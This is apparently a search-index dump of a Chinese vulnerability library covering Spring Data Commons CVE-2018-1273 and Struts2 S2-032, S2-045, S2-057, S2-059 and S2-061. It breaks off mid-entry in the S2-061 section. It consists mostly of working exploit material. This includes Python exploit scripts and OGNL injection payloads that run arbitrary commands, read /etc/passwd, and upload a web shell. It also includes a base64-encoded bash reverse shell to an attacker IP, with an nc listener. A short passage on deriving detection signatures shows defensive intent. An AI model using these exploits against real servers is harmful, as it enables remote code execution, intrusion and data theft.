<p><code>isInvalidPath</code>\u7528\u4e8e\u68c0\u6d4b\u5176\u4e2d\u662f\u5426\u542b\u6709<code>:/</code>\u3001<code>..</code>\u3001<code>WEB-INF</code>\u7b49\u5173\u952e\u5b57\u6837\uff0c<code>isInvalidEncodedPath</code>\u4e2d\u5728\u8fdb\u884c\u7f16\u89e3\u7801\u540e\u4ecd\u662f\u8c03\u7528<code>isInvalidPath</code>\u8fdb\u884c\u68c0\u6d4b\u3002</p> <p>\u200b                </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/","title":"!/usr/bin/python3","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#-codingutf-8-","title":"-- coding:utf-8 --","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#authorzhzyker","title":"author:zhzyker","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#fromhttpsgithubcomzhzykerexphub","title":"from:https://github.com/zhzyker/exphub","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Spring/cve-2018-1273_cmd/#telegramtmezhzyker","title":"telegram:t.me/zhzyker","text":"<p>import requests import sys</p> <p>if len(sys.argv)!=3:     print('+----------------------------------------------------------------------------+')     print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                       +')     print('+      Spring Data Commons Remote Code Execution (No display)              \u00a0 +')     print('+----------------------------------------------------------------------------+')     print('+ USE: python3 cve-2018-1273_cmd.py  \"\"                            +')     print('+ EXP: python3 cve-2018-1273_cmd.py http://1.1.1.1:8080 \"touch /tmp/exphub\"  +')     print('+ VER: Spring Data Commons 1.13 to 1.13.10                                   +')     print('+      Spring Data Commons 2.0 to 2.0.5                                      +')     print('+----------------------------------------------------------------------------+')     sys.exit() <p>url = sys.argv[1] cmd = sys.argv[2] vuln = url + \"/users\"  </p> <p>headers = {     'Host': \"localhost:8080\",     'Connection': \"keep-alive\",     'Content-Length': \"120\",     'Pragma': \"no-cache\",     'Cache-Control': \"no-cache\",     'Origin': \"http://localhost:8080\",     'Upgrade-Insecure-Requests': \"1\",     'Content-Type': \"application/x-www-form-urlencoded\",     'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\",     'Accept': \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8\",     'Referer': \"http://localhost:8080/users?page=0&amp;size=5\",     'Accept-Encoding': \"gzip, deflate, br\",     'Accept-Language': \"zh-CN,zh;q=0.9,en;q=0.8\"     }</p> <p>payload = \"username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&amp;password=&amp;repeatedPassword=\" % cmd</p> <p>try:     r = requests.post(vuln, data=payload, headers=headers)     if r.status_code == 500:         print (\"[+] Code executed successfully\")     else:         print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\") except:     print (\"[-] Target Not CVE-2018-1273 Vuln, Good Luck\")</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"Struts2 S2-032\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":"","tags":["RCE","struts2","\u767d\u9601-\u6f0f\u6d1e\u5e93","\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Struts 2.3.20 - Struts Struts 2.3.28\uff082.3.20.3\u548c2.3.24.3\u9664\u5916\uff09</p>","tags":["RCE","struts2","\u767d\u9601-\u6f0f\u6d1e\u5e93","\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp","title":"EXP","text":"<pre><code>?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat /etc/passwd\n</code></pre>","tags":["RCE","struts2","\u767d\u9601-\u6f0f\u6d1e\u5e93","\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"Struts2 S2-045\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Struts 2.3.5 \u2013 Struts 2.3.31 Struts 2.5 \u2013 Struts 2.5.10</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC","text":"<pre><code>Content-Type:%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp","title":"\u6f0f\u6d1e\u9a8c\u8bc1EXP","text":"<pre><code>import requests\nimport sys\nimport httplib\ndef poc(url):\n    httplib.HTTPConnection._http_vsn_str='HTTP/1.0'\n    payload = \"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}\"\n    headers = {}\n    headers[\"Content-Type\"] = payload\n    r = requests.get(url, headers=headers)\n    if \"105059592\" in r.content:\n        return True\n    return False\n\nif __name__ == '__main__':\n    if len(sys.argv) == 1:\n        print \"python s2-045.py target\"\n        sys.exit()\n    elif poc(sys.argv[1]):\n        print \"vulnerable\"\n    else:\n        print \"not vulnerable\"\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc_1","title":"\u547d\u4ee4\u6267\u884cPOC","text":"<pre><code>Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#exp_1","title":"\u547d\u4ee4\u6267\u884cEXP","text":"<pre><code>#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport urllib2\nimport httplib\n\ndef exploit(url, cmd):\n    payload = \"%{(#_='multipart/form-data').\"\n    payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\n    payload += \"(#_memberAccess?\"\n    payload += \"(#_memberAccess=#dm):\"\n    payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\n    payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\n    payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\"\n    payload += \"(#ognlUtil.getExcludedClasses().clear()).\"\n    payload += \"(#context.setMemberAccess(#dm)))).\"\n    payload += \"(#cmd='%s').\" % cmd\n    payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\"\n    payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\"\n    payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\"\n    payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\"\n    payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\"\n    payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\"\n    payload += \"(#ros.flush())}\"\n\n    try:\n        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}\n        request = urllib2.Request(url, headers=headers)\n        page = urllib2.urlopen(request).read()\n    except httplib.IncompleteRead, e:\n        page = e.partial\n\n    print(page)\n    return page\n\nif __name__ == '__main__':\n    import sys\n    if len(sys.argv) != 3:\n        print(\"[*] struts2_S2-045.py &lt;url&gt; &lt;cmd&gt;\")\n    else:\n        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')\n        url = sys.argv[1]\n        cmd = sys.argv[2]\n        print(\"[*] cmd: %s\\n\" % cmd)\n        exploit(url, cmd)\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#getshell-poc","title":"GetShell POC\uff08\u6587\u4ef6\u4e0a\u4f20\uff09","text":"<p>GET\u5305\u4fee\u6539\u4e3aPOST\uff0c\u6dfb\u52a0\u53c2\u6570?f=a.jsp\uff0c\u5185\u5bb9\u4e3a\u60f3\u8981\u4e0a\u4f20\u7684\u5185\u5bb9\u5373\u53ef\u3002</p> <pre><code>_multipart/form-data%{(#o=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#o):((#c=#context['com.opensymphony.xwork2.ActionContext.container']).(#g=#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#f=new java.io.File(#req.getRealPath('/'),#req.getParameter('f'))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))}\n</code></pre> <p> </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/","title":"Struts2 S2-057 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2018-11776)","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/#_1","title":"\u5f71\u54cd\u73af\u5883","text":"<p>Struts &lt;= Struts 2.3.34, Struts 2.5.16</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2018-11776%29/#_2","title":"\u5229\u7528","text":"<p>S2-057\u8981\u6c42\u5177\u5907\u4ee5\u4e0b\u6761\u4ef6: action\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e\u540d\u79f0\u7a7a\u95f4\u5c5e\u6027\uff0c\u6216\u8005\u4f7f\u7528\u4e86\u901a\u914d\u7b26 \u540d\u79f0\u7a7a\u95f4\u5c06\u7531\u7528\u6237\u4eceuri\u4f20\u9012\u5e76\u89e3\u6790\u4e3aOGNL\u8868\u8fbe\u5f0f\uff0c\u6700\u7ec8\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 Payload:</p> <pre><code>http://your-ip:8080/%24%7b%31%2b%31%7d/actionChain1.action \n</code></pre> <p> </p> <p>\u53ef\u4ee5\u770b\u5230\u7b97\u51fa\u4e861+1=2\u7684\u7ed3\u679c \u53c2\u8003POC \uff1ahttps://github.com/Fnzer0/S2-057-poc python 1.py -u http://192.168.111.129:8080/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c id --exp </p> <p> </p> <p>\u53d1\u73b0\u6267\u884c\u4e86id\u547d\u4ee4</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/","title":"\u4e00\u3001\u7b80\u4ecb","text":"<p>2020\u5e7408\u670813\u65e5\uff0cApache\u5b98\u65b9\u53d1\u5e03\u4e86Struts2\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u7684\u98ce\u9669\u901a\u544a\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3aCVE-2019-0230\uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a\u9ad8\u5371\uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a8.5</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_2","title":"\u4e8c\u3001\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Struts2\u662f\u4e00\u4e2a\u57fa\u4e8eMVC\u8bbe\u8ba1\u6a21\u5f0f\u7684Web\u5e94\u7528\u6846\u67b6\uff0c\u5b83\u672c\u8d28\u4e0a\u76f8\u5f53\u4e8e\u4e00\u4e2aservlet\uff0c\u5728MVC\u8bbe\u8ba1\u6a21\u5f0f\u4e2d\uff0cStruts2\u4f5c\u4e3a\u63a7\u5236\u5668(Controller)\u6765\u5efa\u7acb\u6a21\u578b\u4e0e\u89c6\u56fe\u7684\u6570\u636e\u4ea4\u4e92\u3002</p> <p>\u6f0f\u6d1e\u4ea7\u751f\u7684\u4e3b\u8981\u539f\u56e0\u662f\u56e0\u4e3aApache Struts\u6846\u67b6\u5728\u5f3a\u5236\u6267\u884c\u65f6\uff0c\u4f1a\u5bf9\u5206\u914d\u7ed9\u67d0\u4e9b\u6807\u7b7e\u5c5e\u6027(\u5982id)\u7684\u5c5e\u6027\u503c\u6267\u884c\u4e8c\u6b21ognl\u89e3\u6790\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u5230\u53ef\u88ab\u5916\u90e8\u8f93\u5165\u8fdb\u884c\u4fee\u6539\uff0c\u4e14\u4f1a\u6267\u884cOGNL\u8868\u8fbe\u5f0f\u7684Struts2\u6807\u7b7e\u7684\u5c5e\u6027\u503c\uff0c\u5f15\u53d1OGNL\u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u6700\u7ec8\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u5f71\u54cd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_3","title":"\u4e09\u3001\u5f71\u54cd\u7248\u672c","text":"<pre><code>Struts 2.0.0 \u2013 Struts 2.5.20\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_4","title":"\u56db\u3001\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#1","title":"\uff081\uff09\u6f0f\u6d1e\u73af\u5883","text":"<p>\u653b\u51fb\u673a\uff1a192.168.1.129</p> <p>\u9776\u673a\uff1a  192.168.1.12</p> <p>\u8fd9\u91cc\u4f7f\u7528vulhub\uff0c\u5f88\u65b9\u4fbf\u3002</p> <pre><code>docker-compose up -d\n</code></pre> <p>\u542f\u52a8\u73af\u5883\u4e4b\u540e\u8bbf\u95eehttp://your-ip:8080</p> <p></p> <p>\uff082\uff09\u6f0f\u6d1e\u9a8c\u8bc1</p> <p>\u7531\u4e8e\u8be5\u6f0f\u6d1e\u662f\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e\uff0c\u4e5f\u5c31\u662f\u5bf9\u4e8e\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u8fdb\u884c\u4e86\u4e8c\u6b21\u5904\u7406\u3002</p> <p>\u4ece\u800c\u653b\u51fb\u8005\u5bf9\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c\u7279\u610f\u6784\u9020\uff0c\u7136\u540e\u5b9e\u73b0\u653b\u51fb\u6210\u3002</p> <p>URL <code>http://192.168.1.12:8080/?id=%25{2*3}</code> </p> <p></p> <p>\uff083\uff09\u6f0f\u6d1e\u590d\u73b0</p> <p>\u6784\u9020POC</p> <p>\u7528\u6765\u53cd\u5f39shell</p> <p>\u8fd9\u91cc\u8981\u4fee\u6539\u4e24\u4e2a\u5730\u65b9\uff1a</p> <p>1.\u9776\u673aIP</p> <p>192.168.1.12</p> <p>2.\u653b\u51fb\u673aIP\u53cd\u5f39shell base64\u7f16\u7801</p> <p>bash -i &gt;&amp; /dev/tcp/192.168.1.129/6666 0&gt;&amp;1</p> <pre><code>import` `requests``url ``=` `\"http://192.168.1.12:8080\"``data1 ``=` `{``  ``\"id\"``: ``\"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\"``}``data2 ``=` `{``  ``\"id\"``: ``\"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c  {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIvNjY2NiAwPiYxCg==}|{base64,-d}|{bash,-i}'))}\"``}``res1 ``=` `requests.post(url, data``=``data1)``res2 ``=` `requests.post(url, data``=``data2)\n</code></pre> <p>1.\u76d1\u542c\u7aef\u53e3</p> <pre><code>nc -lvvp 6666\n</code></pre> <p>2.\u8fd0\u884c\u811a\u672c</p> <pre><code>python3 payload.py\n</code></pre> <p>3.\u53cd\u5f39shell</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_5","title":"\u4e94\u3001\u6f0f\u6d1e\u5206\u6790","text":"<p>\u653b\u51fb\u7684\u65f6\u5019\u6293\u53d6\u6570\u636e\u5305</p> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-059/#_6","title":"\u516d\u3001\u7279\u5f81\u63d0\u53d6","text":"<p>\u4ece\u653b\u51fb\u6570\u636e\u5305\u91cc\u53ef\u4ee5\u5f88\u6e05\u695a\u7684\u770b\u5230\uff0c\u653b\u51fb\u8005\u901a\u8fc7id\u503c=xxx\uff0c\u6765\u4f20\u5165\u6076\u610f\u7684payload\uff0c</p> <p>\u5176\u4e2d %25\u662f % \uff0c%7B\u662f{\uff0c%7D\u662f}</p> <p>\u800c\u8bf7\u6c42\u5305\u4e2d\u5305\u542bpayload\uff0c\u4f8b\u5982suricata\u89c4\u5219\u4e2d\u53ef\u4ee5\u7528content\u6765\u5339\u914d\u3002</p> <p>\u6211\u4eec\u8fd8\u662f\u5148\u5bf9\u53d1\u9001\u5305\u8fdb\u884cURL\u89e3\u7801:</p> <pre><code>id``=%{(``#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\n</code></pre> <pre><code>\u8fd9\u6837\u5c31\u5f88\u6e05\u6670\u4e86\uff0c\u53ef\u4ee5\u5f97\u5230\u53cc\u5411\u89c4\u5219\uff0c\u6765\u9632\u62a4\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u653b\u51fb\u3002\n</code></pre> \u7279\u5f81 \u8bf4\u660e POST\u65b9\u5f0f http.method=POST \u72b6\u6001\u7801 200 \u8bf7\u6c42\u5934 \u5305\u542b % \u8bf7\u6c42\u5934 \u5305\u542b  { \u8bf7\u6c42\u5934 \u5305\u542b  } \u8bf7\u6c42\u5934\u5305\u542bpayload \u54cd\u5e94\u5934\u5305\u542bpayload"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/","title":"Struts2 061","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#struts2-061","title":"Struts2-061","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x00","title":"0x00 \u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Apache Struts2\u6846\u67b6\u662f\u4e00\u4e2a\u7528\u4e8e\u5f00\u53d1Java EE\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u7684Web\u6846\u67b6\u3002Apache Struts\u4e8e2020\u5e7412\u670808\u65e5\u62ab\u9732 S2-061  Struts  \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-17530)\uff0c\u5728\u4f7f\u7528\u67d0\u4e9btag\u7b49\u60c5\u51b5\u4e0b\u53ef\u80fd\u5b58\u5728OGNL\u8868\u8fbe\u5f0f\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4ece\u800c\u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u98ce\u9669\u6781\u5927\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x01","title":"0x01 \u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Struts2 \u4f1a\u5bf9\u67d0\u4e9b\u6807\u7b7e\u5c5e\u6027(\u6bd4\u5982 <code>id</code>\uff0c\u5176\u4ed6\u5c5e\u6027\u6709\u5f85\u5bfb\u627e) \u7684\u5c5e\u6027\u503c\u8fdb\u884c\u4e8c\u6b21\u8868\u8fbe\u5f0f\u89e3\u6790\uff0c\u56e0\u6b64\u5f53\u8fd9\u4e9b\u6807\u7b7e\u5c5e\u6027\u4e2d\u4f7f\u7528\u4e86 <code>%{x}</code> \u4e14 <code>x</code>  \u7684\u503c\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u7528\u6237\u518d\u4f20\u5165\u4e00\u4e2a <code>%{payload}</code> 